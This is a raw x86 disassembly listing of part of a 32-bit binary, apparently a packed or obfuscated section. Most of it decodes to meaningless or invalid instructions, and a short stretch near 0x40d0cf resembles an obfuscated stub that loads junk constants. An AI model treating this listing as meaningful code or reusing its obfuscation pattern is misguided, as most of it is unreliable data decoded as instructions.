  40cd49:	sahf   
  40cd4a:	or     eax,0xcc07bfde
  40cd4f:	jecxz  0x40cdcd
  40cd51:	push   eax
  40cd52:	push   cs
  40cd53:	fld    TBYTE PTR [edx]
  40cd55:	les    edi,FWORD PTR [edi+0x68]
  40cd58:	sbb    cl,BYTE PTR [eax+0x51]
  40cd5b:	add    eax,0x6c8bc65d
  40cd60:	cmp    DWORD PTR ds:0x3c5b6979,ecx
  40cd66:	fistp  DWORD PTR [eax-0x1cccf7c2]
  40cd6c:	inc    esi
  40cd6d:	ficomp WORD PTR [ebx+edi*1+0x14]
  40cd71:	cmp    ch,0x1e
  40cd74:	inc    esp
  40cd75:	mov    bl,0x51
  40cd77:	je     0x40cdf4
  40cd79:	enter  0x7ce9,0xfc
  40cd7d:	scas   al,BYTE PTR es:[edi]
  40cd7e:	out    dx,eax
  40cd7f:	push   ebx
  40cd80:	push   edx
  40cd81:	scas   eax,DWORD PTR es:[edi]
  40cd82:	pop    ebp
  40cd83:	sub    ch,BYTE PTR [edx-0x24]
  40cd86:	add    dl,BYTE PTR [eax-0x5f528815]
  40cd8c:	or     ebp,DWORD PTR [ecx]
  40cd8e:	and    al,0xc
  40cd90:	mov    al,ds:0x8e817480
  40cd95:	shl    DWORD PTR [ecx+esi*1-0x78],0xb6
  40cd9a:	adc    eax,0x39e1bed1
  40cd9f:	dec    ebx
  40cda0:	cmc    
  40cda1:	cmp    BYTE PTR [edi],bh
  40cda3:	fsubr  st(5),st
  40cda5:	mov    ds:0x71f5e162,eax
  40cdaa:	jp     0x40cd34
  40cdac:	jg     0x40cd42
  40cdae:	mov    edx,0x7fce5f5d
  40cdb3:	fs mov ebx,0x7888b884
  40cdb9:	mov    eax,0x7590497a
  40cdbe:	xchg   ebx,eax
  40cdbf:	push   es
  40cdc0:	cs inc ebx
  40cdc2:	repnz test DWORD PTR [ebp-0x1fc8e492],ebx
  40cdc9:	push   cs
  40cdca:	in     al,dx
  40cdcb:	ror    BYTE PTR [eax+0x7ced9173],1
  40cdd1:	stos   BYTE PTR es:[edi],al
  40cdd2:	repz pop es
  40cdd4:	shl    DWORD PTR [esi],1
  40cdd6:	test   esi,ebx
  40cdd8:	adc    DWORD PTR [edx-0x66f97ed1],edi
  40cdde:	sub    eax,0xf5be0a5e
  40cde3:	pmaddwd mm5,QWORD PTR [ebx+0x3468ef28]
  40cdea:	jmp    0xdb8e5406
  40cdef:	imul   ebp,edi,0x7b
  40cdf2:	rol    DWORD PTR [edi+ecx*1-0x75],cl
  40cdf6:	cs jg  0x40cdc2
  40cdf9:	sbb    BYTE PTR [ecx+eiz*2-0x33a4b299],cl
  40ce00:	(bad)  
  40ce01:	pop    ecx
  40ce02:	wrmsr  
  40ce04:	test   eax,0xfb20e129
  40ce09:	sti    
  40ce0a:	cmc    
  40ce0b:	int    0x10
  40ce0d:	out    0xf,eax
  40ce0f:	or     DWORD PTR [esi+0x1d164653],ecx
  40ce15:	push   0x977680b6
  40ce1a:	in     al,dx
  40ce1b:	inc    edx
  40ce1c:	fild   QWORD PTR [ebx]
  40ce1e:	mov    al,0x43
  40ce20:	mov    eax,ds:0x75ff6972
  40ce25:	mov    ebx,0xbfb84cdd
  40ce2a:	icebp  
  40ce2b:	out    dx,eax
  40ce2c:	jne    0x40ce1e
  40ce2e:	lods   al,BYTE PTR ds:[esi]
  40ce2f:	sbb    al,0x5
  40ce31:	sbb    al,0xc5
  40ce33:	sub    eax,0x7fc409b7
  40ce38:	mov    ds:0x81daf0cb,al
  40ce3d:	addr16 dec esp
  40ce3f:	mov    edi,0xb9eeb6e
  40ce44:	pop    ebx
  40ce45:	push   es
  40ce46:	sbb    dl,BYTE PTR [ebx+0x32]
  40ce49:	dec    edx
  40ce4a:	mov    esp,0x18b88f4f
  40ce4f:	mov    al,ds:0x9cc74523
  40ce54:	mov    edx,0x7e137d81
  40ce59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce5a:	rol    BYTE PTR [esi+0x77],1
  40ce5d:	jecxz  0x40ce85
  40ce5f:	inc    ecx
  40ce60:	inc    ecx
  40ce61:	in     eax,0xd8
  40ce63:	pop    edi
  40ce64:	xor    edi,edi
  40ce66:	std    
  40ce67:	add    eax,DWORD PTR [ebx]
  40ce69:	push   esp
  40ce6a:	jp     0x40ceac
  40ce6c:	xchg   BYTE PTR [edx+0x68d7d542],ch
  40ce72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce73:	in     eax,0x84
  40ce75:	mov    ds:0xc2baec9a,al
  40ce7a:	rol    DWORD PTR ds:0xacfb9a6a,cl
  40ce80:	or     DWORD PTR [ebx-0x40],eax
  40ce83:	adc    BYTE PTR [esi],dh
  40ce85:	jle    0x40ce84
  40ce87:	xchg   ecx,eax
  40ce88:	xchg   esi,eax
  40ce89:	xor    eax,ebx
  40ce8b:	lea    edi,[esi+ebx*1]
  40ce8e:	inc    edx
  40ce8f:	sub    al,0x8d
  40ce91:	dec    edx
  40ce92:	jp     0x40ceeb
  40ce94:	push   eax
  40ce95:	popf   
  40ce96:	dec    ecx
  40ce97:	push   eax
  40ce98:	jns    0x40ceea
  40ce9a:	(bad)  
  40ce9c:	add    al,0x9e
  40ce9e:	sbb    al,0xfb
  40cea0:	sub    eax,0x2e23689
  40cea5:	mov    ds:0x300f7a60,eax
  40ceaa:	loope  0x40ce91
  40ceac:	cs jae 0x40ced4
  40ceaf:	inc    ebp
  40ceb0:	jp     0x40ce92
  40ceb2:	pop    ds
  40ceb3:	jae    0x40cedb
  40ceb5:	jnp    0x40cee0
  40ceb7:	mov    DWORD PTR [ecx-0x73],ecx
  40ceba:	cli    
  40cebb:	xor    al,0x8
  40cebd:	mov    ch,0x2d
  40cebf:	cwde   
  40cec0:	xlat   BYTE PTR ds:[ebx]
  40cec1:	rcr    BYTE PTR [edi+0x45],cl
  40cec4:	push   edi
  40cec5:	fadd   QWORD PTR [edi-0x1e05040a]
  40cecb:	mov    DWORD PTR [ebx+0x1085a857],eax
  40ced1:	push   es
  40ced2:	mov    ss,WORD PTR [ecx]
  40ced4:	jmp    0xdd582df
  40ced9:	xchg   ecx,eax
  40ceda:	inc    edx
  40cedb:	not    DWORD PTR [ecx+0x18a8bbb1]
  40cee1:	mov    ch,BYTE PTR [eax-0x3369160f]
  40cee7:	(bad)  
  40cee8:	shr    DWORD PTR [ecx+0x31a00ec1],1
  40ceee:	mov    ebx,0x7e0d1ca8
  40cef3:	pop    ebx
  40cef4:	add    eax,0xfc8153b2
  40cef9:	sbb    ebx,ebx
  40cefb:	mov    al,ds:0x6bfd90d1
  40cf00:	dec    DWORD PTR [edx]
  40cf02:	ret    
  40cf03:	es sbb eax,0x42d8bb12
  40cf09:	dec    esp
  40cf0a:	pop    eax
  40cf0b:	jne    0x40cf77
  40cf0d:	fnstcw WORD PTR [edx]
  40cf0f:	das    
  40cf10:	sete   BYTE PTR [ebp+0x24]
  40cf14:	fsubr  st,st(6)
  40cf16:	sub    al,0x8b
  40cf18:	mov    bh,0x4e
  40cf1a:	xchg   BYTE PTR ds:0x576ed9e,cl
  40cf20:	fsub   DWORD PTR [edi+0x31ca2f4]
  40cf26:	out    dx,eax
  40cf27:	mov    ebp,0xbd2fc261
  40cf2c:	ffreep st(1)
  40cf2e:	inc    edi
  40cf2f:	push   ebp
  40cf30:	je     0x40cf1f
  40cf32:	sbb    esp,DWORD PTR [esi+0x76328c0b]
  40cf38:	mov    ebp,0xfa704be0
  40cf3d:	jmp    0x79387ad7
  40cf42:	cmp    al,0x4
  40cf44:	jno    0x40cf19
  40cf46:	dec    edi
  40cf47:	call   0x9e66:0xa3b92886
  40cf4e:	sub    al,0xb
  40cf50:	adc    DWORD PTR [edi+0x4f],esi
  40cf53:	into   
  40cf54:	xchg   ebp,eax
  40cf55:	in     al,dx
  40cf56:	sbb    bh,BYTE PTR [eax-0x7c]
  40cf59:	aaa    
  40cf5a:	mov    ebp,0xe77a85df
  40cf5f:	inc    eax
  40cf60:	cld    
  40cf61:	jmp    0x60c2:0xf09742e1
  40cf68:	adc    al,0xad
  40cf6a:	add    DWORD PTR [eax-0x2bfc9b16],ebp
  40cf70:	xchg   DWORD PTR [edx+0x4745f065],eax
  40cf76:	cmp    esi,DWORD PTR [eax-0x20718700]
  40cf7c:	jbe    0x40cfe1
  40cf7e:	pop    ebx
  40cf7f:	xchg   esi,eax
  40cf80:	call   0xb5980f94
  40cf85:	dec    edx
  40cf86:	cmp    ebx,DWORD PTR [ebx+eiz*1-0x1d5d2e0c]
  40cf8d:	frstor [edi+0x5ccba899]
  40cf93:	test   BYTE PTR [edi+0x41d0ba28],dl
  40cf99:	aam    0x2e
  40cf9b:	enter  0xa1c6,0x67
  40cf9f:	cmc    
  40cfa0:	inc    ecx
  40cfa1:	pop    es
  40cfa2:	jb     0x40d023
  40cfa4:	inc    ecx
  40cfa5:	pop    edi
  40cfa6:	sahf   
  40cfa7:	cmp    al,0x87
  40cfa9:	xor    ebp,edi
  40cfab:	jmp    0x6a959b3a
  40cfb0:	sti    
  40cfb1:	inc    edx
  40cfb2:	dec    edi
  40cfb3:	cwde   
  40cfb4:	out    0xe7,al
  40cfb6:	push   ebp
  40cfb7:	push   edi
  40cfb8:	jno    0x40d02c
  40cfba:	out    dx,al
  40cfbb:	dec    esi
  40cfbc:	adc    al,0x49
  40cfbe:	cli    
  40cfbf:	adc    dl,bh
  40cfc1:	ret    0x1d5f
  40cfc4:	imul   eax,DWORD PTR [esp+edi*1+0x3a6c717],0x47
  40cfcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfce:	aad    0x77
  40cfd0:	jnp    0x40d03e
  40cfd2:	mov    ah,0xb8
  40cfd4:	cmp    al,0xd6
  40cfd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfd7:	mov    ?,WORD PTR [ebp+0x5f]
  40cfda:	idiv   cl
  40cfdc:	leave  
  40cfdd:	mov    esp,DWORD PTR [edi]
  40cfdf:	pop    ecx
  40cfe0:	and    eax,0xa72083c
  40cfe5:	call   0x8245:0x7e822b3
  40cfec:	cwde   
  40cfed:	icebp  
  40cfee:	(bad)  
  40cfef:	mov    cl,0xe6
  40cff1:	cli    
  40cff2:	call   0xd096855b
  40cff7:	fidivr DWORD PTR [esi-0x789ba01f]
  40cffd:	mov    esi,0x7413feb7
  40d002:	(bad)  
  40d003:	push   cs
  40d004:	(bad)  
  40d005:	sub    ax,0x1ded
  40d009:	out    0xd3,al
  40d00b:	or     esp,DWORD PTR [edi+0x18db9666]
  40d011:	sub    dl,bh
  40d013:	cmc    
  40d014:	adc    esi,DWORD PTR [ebx+0xbca390f]
  40d01a:	jae    0x40cfa3
  40d01c:	neg    DWORD PTR [edi]
  40d01e:	mov    BYTE PTR [esi+0x2e],dl
  40d021:	sbb    bh,BYTE PTR [eax-0xb6c8d4d]
  40d027:	rcr    cl,cl
  40d029:	cmp    DWORD PTR [ecx],eax
  40d02b:	cmp    dh,BYTE PTR ds:[edx-0x4a]
  40d02f:	fcomp  DWORD PTR [ebp+0x23]
  40d032:	ror    edi,1
  40d034:	xor    al,0x61
  40d036:	imul   eax,DWORD PTR [edx],0xab4c957d
  40d03c:	jp     0x40d09d
  40d03e:	cs inc edx
  40d040:	pop    edi
  40d041:	mov    ah,0x85
  40d043:	add    bh,ah
  40d045:	adc    ch,BYTE PTR [ebp+eiz*8+0x2d]
  40d049:	cdq    
  40d04a:	out    0x60,al
  40d04c:	mov    al,ds:0xaabce357
  40d051:	enter  0xda1c,0x59
  40d055:	scas   al,BYTE PTR es:[edi]
  40d056:	mov    BYTE PTR [ebx+0x3d795dc6],bh
  40d05c:	pop    ds
  40d05d:	add    BYTE PTR [ebp-0x53],dl
  40d060:	dec    esp
  40d061:	addr16 test eax,0xad9b961b
  40d067:	shl    bh,0xd4
  40d06a:	fnstenv [ebx+0x60]
  40d06d:	cwde   
  40d06e:	push   esi
  40d06f:	ja     0x40d018
  40d071:	jne    0x40d019
  40d073:	adc    dh,dl
  40d075:	push   esi
  40d076:	in     al,dx
  40d077:	inc    ebx
  40d078:	jno    0x40d0e1
  40d07a:	add    DWORD PTR [edx+0x7e],ebx
  40d07d:	cs pop es
  40d07f:	(bad)  [ebx-0x4d92225f]
  40d085:	dec    edi
  40d086:	in     al,dx
  40d087:	neg    edi
  40d089:	test   al,0xa1
  40d08b:	sbb    eax,0x3b07b29b
  40d090:	cmp    esp,ebx
  40d092:	mov    bh,0xb
  40d094:	sub    BYTE PTR [ebp+0x61],0x98
  40d098:	ret    
  40d099:	xor    DWORD PTR [ebx-0x67],0x6756be01
  40d0a0:	jnp    0x40d10e
  40d0a2:	mov    dh,0x19
  40d0a4:	ss and al,0xd5
  40d0a7:	aam    0xde
  40d0a9:	outs   dx,BYTE PTR ds:[esi]
  40d0aa:	add    al,BYTE PTR [ebx+0x42aab563]
  40d0b0:	pop    eax
  40d0b1:	ins    DWORD PTR es:[edi],dx
  40d0b2:	test   al,0xc0
  40d0b4:	fdivp  st(2),st
  40d0b6:	(bad)  
  40d0b7:	cmp    BYTE PTR [ecx-0x44],bl
  40d0ba:	sub    DWORD PTR [edi],ebp
  40d0bc:	and    DWORD PTR [eax],edx
  40d0be:	cs cmc 
  40d0c0:	add    eax,0x39f82150
  40d0c5:	mov    ecx,0x79fa87f3
  40d0ca:	ret    0x76fb
  40d0cd:	jnp    0x40d088
  40d0cf:	mov    DWORD PTR [ebp-0x20],eax
  40d0d2:	adc    edx,0x5a
  40d0d5:	mov    DWORD PTR [ebp-0x1c],edx
  40d0d8:	mov    DWORD PTR [ebp-0x80],0xfa4
  40d0df:	mov    DWORD PTR [ebp-0x70],0x618e
  40d0e6:	mov    DWORD PTR [ebp-0x6c],0x811
  40d0ed:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40d0f7:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40d101:	mov    DWORD PTR [ebp-0x88],0x58ff
  40d10b:	mov    DWORD PTR [ebp-0x84],0x7394
  40d115:	xor    eax,eax
  40d117:	inc    eax
  40d118:	mov    DWORD PTR [ebp-0x64],eax
  40d11b:	mov    DWORD PTR [ebp-0x8],0x5f59
  40d122:	mov    DWORD PTR [ebp-0x4],0x652b
  40d129:	mov    DWORD PTR [ebp-0xc],0xf43
  40d130:	mov    DWORD PTR [ebp-0x14],0x22dc
  40d137:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40d13e:	mov    DWORD PTR [ebp-0x30],0x28e1
  40d145:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40d14c:	mov    DWORD PTR [ebp-0x50],0x3910
  40d153:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40d15a:	mov    DWORD PTR [ebp-0x24],0x6111
  40d161:	mov    DWORD PTR [ebp-0x78],ecx
  40d164:	mov    DWORD PTR [ebp-0x34],ecx
  40d167:	mov    DWORD PTR [ebp-0x44],0x207a
  40d16e:	mov    DWORD PTR [ebp-0x60],eax
  40d171:	mov    DWORD PTR [ebp-0x8c],0x7840
  40d17b:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40d182:	mov    eax,DWORD PTR [ebp-0x30]
  40d185:	or     eax,0x70c5
  40d18a:	add    eax,DWORD PTR [ebp-0x2c]
  40d18d:	mov    ecx,DWORD PTR [ebp-0x14]
  40d190:	or     eax,ecx
  40d192:	mov    ecx,0xce40
  40d197:	sub    ecx,eax
  40d199:	jmp    0x40d5a4
  40d19e:	imul   eax,ebx,0xb67c365b
  40d1a4:	lods   al,BYTE PTR ds:[esi]
  40d1a5:	xchg   esp,eax
  40d1a6:	adc    dl,0x9e
  40d1a9:	nop
  40d1aa:	shl    DWORD PTR [eax-0x186e61ae],1
  40d1b0:	mov    esi,0xbec492be
  40d1b5:	mov    esi,0x8917afc7
  40d1ba:	sbb    BYTE PTR [ecx+0x3a1022f0],dl
  40d1c0:	xor    al,0xe9
  40d1c2:	push   ss
  40d1c3:	dec    edi
  40d1c4:	jmp    0xd07a:0xa2dd05f9
  40d1cb:	arpl   WORD PTR [esi],bx
  40d1cd:	mov    ebx,DWORD PTR [ebx-0x5326a593]
  40d1d3:	xlat   BYTE PTR ds:[ebx]
  40d1d4:	iret   
  40d1d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1d6:	stc    
  40d1d7:	mov    al,0xe8
  40d1d9:	into   
  40d1da:	cmp    DWORD PTR ds:0x8f1331d5,edx
  40d1e0:	and    eax,0x3438e686
  40d1e5:	pop    edx
  40d1e6:	es inc ecx
  40d1e8:	adc    eax,0xb218a417
  40d1ed:	pushf  
  40d1ee:	repnz outs dx,DWORD PTR ds:[esi]
  40d1f0:	adc    al,0x98
  40d1f2:	or     al,0x64
  40d1f4:	xor    BYTE PTR [edi],bl
  40d1f6:	enter  0x8c4a,0x1c
  40d1fa:	daa    
  40d1fb:	cmp    eax,0xb5e56e9c
  40d200:	mov    bh,0x70
  40d202:	push   edi
  40d203:	dec    edx
  40d204:	adc    BYTE PTR [ebp-0x199554af],bl
  40d20a:	jle    0x40d214
  40d20c:	pop    esi
  40d20d:	in     eax,dx
  40d20e:	or     DWORD PTR [edx],0xb2e96e05
  40d214:	ins    BYTE PTR es:[edi],dx
  40d215:	retf   
  40d216:	inc    ecx
  40d217:	cmp    DWORD PTR [edx+0x126237ac],eax
  40d21d:	dec    ebx
  40d21e:	push   ebp
  40d21f:	xchg   esi,eax
  40d220:	xor    ah,BYTE PTR [edx+0x6c9c1b3b]
  40d226:	dec    ebp
  40d227:	aas    
  40d228:	cmp    BYTE PTR [esi],bh
  40d22a:	sbb    BYTE PTR [eax],ah
  40d22c:	imul   BYTE PTR [bx+di+0x4cfe]
  40d231:	dec    esp
  40d232:	lahf   
  40d233:	pop    ss
  40d234:	push   eax
  40d235:	adc    BYTE PTR [edi+0x458dd1e9],0x3f
  40d23c:	add    ah,BYTE PTR [ebx+eax*4-0x616a7c91]
  40d243:	ds sub esp,edx
  40d246:	add    bh,dh
  40d248:	dec    esp
  40d249:	or     eax,0xfaf10226
  40d24e:	leave  
  40d24f:	iret   
  40d250:	aam    0xdc
  40d252:	sub    DWORD PTR [edx],ecx
  40d254:	inc    esi
  40d255:	lea    edx,[esi]
  40d257:	pop    ebx
  40d258:	loope  0x40d25e
  40d25a:	(bad)  
  40d25b:	sbb    eax,0xf5a796b3
  40d260:	or     edi,DWORD PTR [edx]
  40d262:	ins    BYTE PTR es:[edi],dx
  40d263:	test   BYTE PTR [eax],cl
  40d265:	fwait
  40d266:	adc    DWORD PTR [esi+0x55db385a],eax
  40d26c:	sbb    ch,BYTE PTR [ebp-0x6c271f87]
  40d272:	jl     0x40d2c9
  40d274:	sbb    eax,DWORD PTR [eax+edi*8]
  40d277:	xchg   esi,ebx
  40d279:	fsub   DWORD PTR [ebx-0x38]
  40d27c:	ret    
  40d27d:	outs   dx,BYTE PTR ds:[esi]
  40d27e:	inc    eax
  40d27f:	imul   ecx,DWORD PTR [edi+eiz*1-0x2ae95334],0xffffffcd
  40d287:	sub    BYTE PTR [ebx+0x65],cl
  40d28a:	jns    0x40d272
  40d28c:	ficom  DWORD PTR [edx]
  40d28e:	jp     0x40d287
  40d290:	adc    ebx,edi
  40d292:	ret    0x9c02
  40d295:	je     0x40d2d8
  40d297:	arpl   WORD PTR [edx],dx
  40d299:	fwait
  40d29a:	mov    ch,0x35
  40d29c:	cmc    
  40d29d:	cmp    edx,DWORD PTR [edx-0x17]
  40d2a0:	mov    esi,0xf355b19e
  40d2a5:	ins    DWORD PTR es:[edi],dx
  40d2a6:	sub    eax,0x542f596a
  40d2ab:	sub    BYTE PTR [ebx],0x37
  40d2ae:	and    al,0x42
  40d2b0:	sub    al,dh
  40d2b2:	jb     0x40d2c8
  40d2b4:	pop    ds
  40d2b5:	call   0x5f925bfe
  40d2ba:	outs   dx,BYTE PTR ds:[esi]
  40d2bb:	ja     0x40d2da
  40d2bd:	sub    al,0x51
  40d2bf:	mov    di,WORD PTR [edx+0x76367884]
  40d2c6:	pop    ecx
  40d2c7:	int3   
  40d2c8:	icebp  
  40d2c9:	sbb    al,0xf0
  40d2cb:	push   es
  40d2cc:	xchg   edi,eax
  40d2cd:	xchg   esi,eax
  40d2ce:	stos   BYTE PTR es:[edi],al
  40d2cf:	int3   
  40d2d0:	pusha  
  40d2d1:	sbb    eax,0x39ed17ed
  40d2d6:	pusha  
  40d2d7:	inc    esi
  40d2d8:	mov    bl,0x11
  40d2da:	jl     0xbf68104f
  40d2e0:	mov    ebp,0xf6f3ad51
  40d2e5:	(bad)  
  40d2e6:	fmul   DWORD PTR [ecx+0x52]
  40d2e9:	adc    al,0x29
  40d2eb:	loopne 0x40d27e
  40d2ed:	les    esp,FWORD PTR ds:0xa48be310
  40d2f3:	retf   
  40d2f4:	cmp    DWORD PTR [ebp+ebp*8-0x5f],esp
  40d2f8:	mov    ebp,0x4af1853d
  40d2fd:	leave  
  40d2fe:	or     al,0x5c
  40d300:	call   ecx
  40d302:	test   eax,0x4427ba9f
  40d307:	jno    0x40d2f6
  40d309:	addr16 icebp 
  40d30b:	push   edi
  40d30c:	aam    0xbc
  40d30e:	or     cl,BYTE PTR [eax+esi*1+0x4b]
  40d312:	inc    esp
  40d313:	pop    DWORD PTR [eax+0x1537c04]
  40d319:	shl    DWORD PTR [edx+0x543f47c1],1
  40d31f:	pop    ecx
  40d321:	xor    edi,DWORD PTR [ebx]
  40d323:	push   edx
  40d324:	mov    esp,0x84c0108
  40d329:	adc    BYTE PTR ds:0x278f9cc5,cl
  40d32f:	and    BYTE PTR [edi+0x2f],bh
  40d332:	ins    BYTE PTR es:[edi],dx
  40d333:	jne    0x40d3ab
  40d335:	fdivr  DWORD PTR [ecx-0xdae39b4]
  40d33b:	outs   dx,DWORD PTR ds:[esi]
  40d33c:	inc    edx
  40d33d:	xor    BYTE PTR [ebx],0x17
  40d340:	outs   dx,BYTE PTR ds:[esi]
  40d341:	mov    ch,0xf7
  40d343:	cmp    BYTE PTR [eax-0x5],ch
  40d346:	out    dx,eax
  40d347:	adc    esi,ebx
  40d349:	repz and al,0xcb
  40d34c:	mov    edx,0x9ec68360
  40d351:	sub    bl,BYTE PTR [ebx-0x7f]
  40d354:	into   
  40d355:	jge    0x40d342
  40d357:	ret    0xf8d2
  40d35a:	ret    0x83a4
  40d35d:	jb     0x40d319
  40d35f:	js     0x40d36f
  40d361:	int3   
  40d362:	and    eax,0xd2be1f56
  40d367:	jp     0x40d304
  40d369:	add    BYTE PTR ds:0x8631b787,ch
  40d36f:	pushf  
  40d370:	cli    
  40d371:	(bad)  
  40d373:	sub    DWORD PTR [ebx-0x72b1a695],esp
  40d379:	mov    WORD PTR [eax+0x3f],ds
  40d37c:	push   0x10
  40d37e:	xchg   ebx,eax
  40d37f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d380:	or     al,0x3b
  40d382:	mov    ds:0xbabc3e82,eax
  40d387:	dec    esp
  40d388:	mov    edi,0xc8d7bac7
  40d38d:	dec    edx
  40d38e:	mov    bh,0x96
  40d390:	add    eax,0xed02ef19
  40d395:	call   0xf729:0xc96b85c3
  40d39c:	sbb    al,0xfa
  40d39e:	and    al,BYTE PTR [eax]
  40d3a0:	xchg   esi,eax
  40d3a1:	push   ebp
  40d3a2:	icebp  
  40d3a3:	and    esi,ebx
  40d3a5:	popf   
  40d3a6:	mov    fs,WORD PTR [edx+0x44]
  40d3a9:	int    0xde
  40d3ab:	mov    WORD PTR [esi],fs
  40d3ad:	je     0x40d350
  40d3af:	push   ebx
  40d3b0:	int    0x25
  40d3b2:	fsub   QWORD PTR [eax]
  40d3b4:	mov    edi,0x9c25cf86
  40d3b9:	xchg   edx,eax
  40d3ba:	cmp    BYTE PTR [ebx],al
  40d3bc:	scas   eax,DWORD PTR es:[edi]
  40d3bd:	and    eax,0xe10a839b
  40d3c2:	popa   
  40d3c3:	push   0x61946d5c
  40d3c8:	mov    esp,0xb1437d2d
  40d3cd:	add    ebx,DWORD PTR [eax]
  40d3cf:	inc    ecx
  40d3d0:	mov    ah,BYTE PTR [esi+0x52]
  40d3d3:	push   esp
  40d3d4:	mov    esp,0xf6437508
  40d3d9:	mov    al,ds:0x20fd57cf
  40d3de:	push   di
  40d3e0:	loopne 0x40d3d0
  40d3e2:	shl    BYTE PTR [edi-0x7fefec46],1
  40d3e8:	sbb    eax,0x377caea9
  40d3ed:	scas   al,BYTE PTR es:[edi]
  40d3ee:	test   al,0x35
  40d3f0:	ja     0x40d43e
  40d3f2:	adc    ah,al
  40d3f4:	add    dl,dl
  40d3f6:	dec    esp
  40d3f7:	fist   DWORD PTR [ecx]
  40d3f9:	loopne 0x40d3f5
  40d3fb:	pop    esi
  40d3fc:	fstp   DWORD PTR [ebx+0x40]
  40d3ff:	sub    esi,DWORD PTR [esi+0x1]
  40d402:	mov    bh,0x5e
  40d404:	(bad)  
  40d405:	fiadd  WORD PTR [eax]
  40d407:	push   eax
  40d408:	out    0x45,al
  40d40a:	cmp    eax,0xb36bf71a
  40d40f:	lock mov ecx,0x138e1131
  40d415:	(bad)  
  40d416:	cld    
  40d417:	pop    edx
  40d418:	leave  
  40d419:	popf   
  40d41a:	lods   eax,DWORD PTR ds:[esi]
  40d41b:	js     0x40d3ee
  40d41d:	inc    eax
  40d41e:	xor    BYTE PTR [bx+di],bl
  40d421:	popf   
  40d422:	adc    bl,ah
  40d424:	mov    cl,0x4f
  40d426:	jmp    0x40d3b0
  40d428:	loop   0x40d447
  40d42a:	or     esp,edx
  40d42c:	xchg   esp,eax
  40d42d:	xchg   ebp,eax
  40d42e:	xchg   ebp,eax
  40d42f:	adc    DWORD PTR [ecx-0x2d],esi
  40d432:	call   DWORD PTR [ebx]
  40d434:	stos   DWORD PTR es:[edi],eax
  40d435:	inc    ebp
  40d436:	popa   
  40d437:	sbb    BYTE PTR ds:0x985b6613,ah
  40d43d:	sbb    DWORD PTR [ebx-0x12],eax
  40d440:	adc    dh,BYTE PTR [ebp+0x19]
  40d443:	mov    eax,DWORD PTR [eax+edi*2-0x648a3c95]
  40d44a:	mov    ds:0x2b1057b7,eax
  40d44f:	je     0x40d498
  40d451:	lods   al,BYTE PTR ds:[esi]
  40d452:	inc    esi
  40d453:	sahf   
  40d454:	mov    dh,0x21
  40d456:	ret    
  40d457:	xchg   esi,eax
  40d458:	mov    ch,0x21
  40d45a:	test   eax,ebx
  40d45c:	loop   0x40d460
  40d45e:	push   ebp
  40d45f:	sbb    esp,DWORD PTR [esi]
  40d461:	repnz aam 0x56
  40d464:	sti    
  40d465:	std    
  40d466:	mov    edi,0x15477a5c
  40d46b:	outs   dx,DWORD PTR ds:[esi]
  40d46c:	add    ch,ah
  40d46e:	lock sbb DWORD PTR [edi+ecx*8+0x55],ebp
  40d473:	fist   WORD PTR [eax+0x1c4fdb02]
  40d479:	dec    edx
  40d47a:	test   eax,0xa2621b1b
  40d47f:	mov    bl,BYTE PTR [ebx]
  40d481:	push   edi
  40d482:	dec    ebx
  40d483:	call   0xd1e9:0xe2441253
  40d48a:	push   esp
  40d48b:	xlat   BYTE PTR ds:[ebx]
  40d48c:	rol    DWORD PTR ds:0x6e753184,0xb0
  40d493:	inc    esi
  40d494:	in     eax,dx
  40d495:	outs   dx,DWORD PTR ds:[esi]
  40d496:	cmp    DWORD PTR [ecx+0x3234ed63],0x62
  40d49d:	jbe    0x40d491
  40d49f:	and    DWORD PTR [eax-0x50],ebp
  40d4a2:	xchg   esi,eax
  40d4a3:	jnp    0x40d486
  40d4a5:	pop    ecx
  40d4a6:	ins    DWORD PTR es:[edi],dx
  40d4a7:	ds out 0xb2,al
  40d4aa:	cmc    
  40d4ab:	pop    ds
  40d4ac:	and    dl,BYTE PTR [ecx+ebp*1+0x16795d5d]
  40d4b3:	in     eax,0x13
  40d4b5:	ja     0x40d44c
  40d4b7:	xor    BYTE PTR [ecx-0x49],bl
  40d4ba:	sub    eax,0xeca8d7b8
  40d4bf:	sahf   
  40d4c0:	js     0x40d48e
  40d4c2:	push   es
  40d4c3:	mov    ds:0x5fdbf0f7,al
  40d4c8:	pop    es
  40d4c9:	adc    DWORD PTR [esi-0x8],edi
  40d4cc:	xchg   esp,eax
  40d4cd:	mov    edx,0x950bbf78
  40d4d2:	aas    
  40d4d3:	jmp    0xee80076f
  40d4d8:	cmp    dl,cl
  40d4da:	jnp    0x4f4447f4
  40d4e0:	iret   
  40d4e1:	jecxz  0x40d4ec
  40d4e3:	stos   BYTE PTR es:[edi],al
  40d4e4:	add    eax,0xd4667cbc
  40d4e9:	outs   dx,DWORD PTR ds:[esi]
  40d4ea:	mov    BYTE PTR [ebx+0x6b6bee33],dl
  40d4f0:	ret    
  40d4f1:	adc    eax,eax
  40d4f3:	ret    0x8a32
  40d4f6:	std    
  40d4f7:	lahf   
  40d4f8:	adc    eax,DWORD PTR [ebp-0x7def046a]
  40d4fe:	cli    
  40d4ff:	icebp  
  40d500:	xor    esp,DWORD PTR [edi+0x46]
  40d503:	sahf   
  40d504:	and    al,0x52
  40d506:	loop   0x40d4a5
  40d508:	jmp    0xb0fe8228
  40d50d:	sub    edx,edx
  40d50f:	sub    edx,DWORD PTR [esi]
  40d511:	outs   dx,BYTE PTR ds:[esi]
  40d512:	and    al,0x1b
  40d514:	jnp    0x40d511
  40d516:	jmp    DWORD PTR [edi]
  40d518:	outs   dx,DWORD PTR ds:[esi]
  40d519:	fcom   QWORD PTR [ebx+0x77]
  40d51c:	pop    edx
  40d51d:	fsub   QWORD PTR ds:0x66d4f920
  40d523:	add    ah,dl
  40d525:	pop    es
  40d526:	jbe    0x40d57c
